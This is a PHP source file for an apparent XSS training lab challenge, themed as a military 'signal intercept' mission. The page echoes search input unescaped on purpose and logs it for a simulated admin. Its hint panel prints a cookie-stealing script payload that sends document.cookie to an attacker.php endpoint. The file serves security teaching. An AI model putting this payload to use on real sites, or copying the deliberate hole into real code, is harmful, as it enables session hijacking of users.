<?php

/**
 * XSS LAB - MIL-OPS INTERFACE (Level 1 Reflected)
 * Mission: Signal Intercept
 * Target: Agent Communication Terminal
 */

namespace Labs\XSS\Challenges;

use App\Core\BaseChallenge;
use App\Core\Session;

class Level1ReflectedMilitary extends BaseChallenge
{
  private string $searchQuery = '';
  private string $searchResult = '';
  private bool $solved = false;

  public function handle(): void
  {
    // Check if already solved via attacker.php callback
    if (Session::get('xss_lvl1_solved') === true) {
      $this->solved = true;
    }

    if ($this->isPost() && isset($_POST['search'])) {
      $this->searchQuery = $_POST['search'];
      // ⚠️ VULNERABILITY: directly output user input without escaping
      $this->searchResult = "Showing results for: " . $this->searchQuery;

      // Log the search for admin panel
      $logDir = ROOT . '/storage/logs';
      if (!is_dir($logDir)) {
        mkdir($logDir, 0755, true);
      }
      $logFile = $logDir . '/search_history.log';
      file_put_contents($logFile, date('[Y-m-d H:i:s]') . ' ' . $this->searchQuery . PHP_EOL, FILE_APPEND);
    }
  }

  public function render(): void
  {
    include_once ROOT . '/shared/military-ui/header.php';
?>

    <!-- MISSION HEADER -->
    <div class="mission-header">
      <div class="mission-title">
        <i class="fas fa-satellite-dish"></i>
        <span>MISSION: SIGNAL INTERCEPT</span>
      </div>

      <div class="mission-grid">
        <div class="mission-stat">
          <div class="stat-label">OBJECTIVE</div>
          <div class="stat-value">STEAL SESSION COOKIE</div>
        </div>
        <div class="mission-stat">
          <div class="stat-label">TARGET SYSTEM</div>
          <div class="stat-value warning">AGENT DATABASE TERMINAL</div>
        </div>
        <div class="mission-stat">
          <div class="stat-label">CLEARANCE REQUIRED</div>
          <div class="stat-value danger">LEVEL 2</div>
        </div>
        <div class="mission-stat">
          <div class="stat-label">VULNERABILITY TYPE</div>
          <div class="stat-value text-blue">REFLECTED XSS</div>
        </div>
      </div>
    </div>

    <!-- BRIEFING PANEL -->
    <div class="terminal-panel">
      <div class="terminal-header">
        <i class="fas fa-file-contract"></i>
        <span>MISSION BRIEFING</span>
      </div>
      <div class="terminal-body">
        <p style="color: var(--text-secondary); margin-bottom: 15px;">
          <span class="text-green">OPERATOR,</span> intelligence indicates that enemy agents use this terminal
          to search personnel records. The system has a critical flaw in its output rendering.
        </p>
        <p style="color: var(--text-secondary); margin-bottom: 15px;">
          Your objective: Inject a malicious script that will exfiltrate the session cookie of any agent
          who views the search results. The target administrator regularly reviews search logs at
          <code class="bg-panel-light px-1 text-amber">?page=xss_admin</code>.
        </p>
        <div
          style="background: rgba(255, 176, 0, 0.1); border-left: 3px solid var(--mil-amber); padding: 12px; font-family: var(--font-mono); font-size: 12px;">
          <span class="text-amber"><i class="fas fa-lightbulb"></i> INTELLIGENCE HINT:</span><br>
          The search term is reflected directly into the HTML response without sanitization.<br>
          Payload suggestion:<br>
          <code class="bg-panel-light px-1" style="display: block; margin-top: 5px; word-break: break-all;">
            &lt;script&gt;fetch('http://localhost/public/attacker.php?cookie='+document.cookie)&lt;/script&gt;
          </code>
        </div>
      </div>
    </div>

    <!-- SEARCH TERMINAL -->
    <div class="terminal-panel">
      <div class="terminal-header">
        <i class="fas fa-terminal"></i>
        <span>AGENT SEARCH TERMINAL</span>
      </div>
      <div class="terminal-body">
        <form method="POST" id="xssForm">
          <div style="margin-bottom: 20px;">
            <label
              style="display: block; font-family: var(--font-mono); font-size: 12px; color: var(--text-secondary); margin-bottom: 8px;">
              <i class="fas fa-search"></i> SEARCH QUERY
            </label>
            <input type="text" name="search" class="mil-input" placeholder="Search by codename or real name..."
              value="<?= htmlspecialchars($this->searchQuery) ?>" autocomplete="off">
          </div>

          <button type="submit" class="mil-button">
            <i class="fas fa-search"></i> EXECUTE SEARCH
          </button>
        </form>
      </div>
    </div>

    <!-- RESULT OUTPUT -->
    <?php if (!empty($this->searchResult)): ?>
      <div class="terminal-panel">
        <div class="terminal-header">
          <i class="fas fa-desktop"></i>
          <span>SEARCH RESULTS</span>
        </div>
        <div class="terminal-body">
          <!-- ⚠️ VULNERABLE OUTPUT - NO ESCAPING = XSS -->
          <div class="output-terminal">
            <?= $this->searchResult ?>
          </div>
        </div>
      </div>
    <?php endif; ?>

    <!-- COMMUNICATION LOG -->
    <div class="terminal-panel">
      <div class="terminal-header">
        <i class="fas fa-comments"></i>
        <span>INTERCEPTED COMMUNICATIONS</span>
      </div>
      <div class="terminal-body">
        <div class="output-terminal" style="min-height: 120px;">
          <span class="text-dim">[10:23:45]</span> <span class="text-blue">AGENT_VIPER:</span> Has anyone checked the new
          database terminal?
          <span class="text-dim">[10:24:12]</span> <span class="text-blue">AGENT_ECHO:</span> Yeah, seems slow but
          functional
          <span class="text-dim">[10:25:03]</span> <span class="text-blue">ADMIN:</span> Reviewing search logs now. Stand
          by.
          <span class="text-dim">[10:25:45]</span> <span class="text-amber">SYSTEM:</span> Admin access granted to search
          history
        </div>
      </div>
    </div>

    <!-- SUCCESS STATE -->
    <?php if ($this->solved): ?>
      <div class="terminal-panel" style="border-color: var(--mil-green);">
        <div class="terminal-header" style="background: rgba(0, 255, 65, 0.1);">
          <i class="fas fa-check-circle text-green"></i>
          <span class="text-green">MISSION ACCOMPLISHED</span>
        </div>
        <div class="terminal-body">
          <p class="text-green" style="font-family: var(--font-mono);">
            <i class="fas fa-trophy"></i> SIGNAL INTERCEPT SUCCESSFUL<br><br>
            You have successfully exploited the reflected XSS vulnerability.<br>
            The administrator's session cookie was captured and transmitted.<br><br>
            <span class="text-dim">Technique: Cross-Site Scripting (Reflected)</span>
          </p>
        </div>
      </div>
    <?php endif; ?>

    <script>
      // Initialize XSS Lab specific functionality
      document.addEventListener('DOMContentLoaded', function() {
        console.log('%c XSS LAB - SIGNAL INTERCEPT LOADED ', 'background: #ffb000; color: black;');

        // Add form submission effect
        const form = document.getElementById('xssForm');
        if (form) {
          form.addEventListener('submit', function() {
            showLoading('QUERYING DATABASE...');
            setTimeout(() => {
              hideLoading();

              // Random security alert chance
              if (Math.random() > 0.7) {
                setTimeout(() => {
                  showSystemAlert('Suspicious script pattern detected in query', 'warning');
                }, 1500);
              }
            }, 600);
          });
        }
      });
    </script>

<?php
    include_once ROOT . '/shared/military-ui/footer.php';
  }

  public function validate(): bool
  {
    error_log("validate() called for xss_lvl1");
    $solved = Session::get('xss_lvl1_solved') === true;
    error_log("solved = " . ($solved ? 'true' : 'false'));
    if ($solved) {
      $this->markCompleted('xss', 'lvl1');
    }
    return $solved;
  }
}
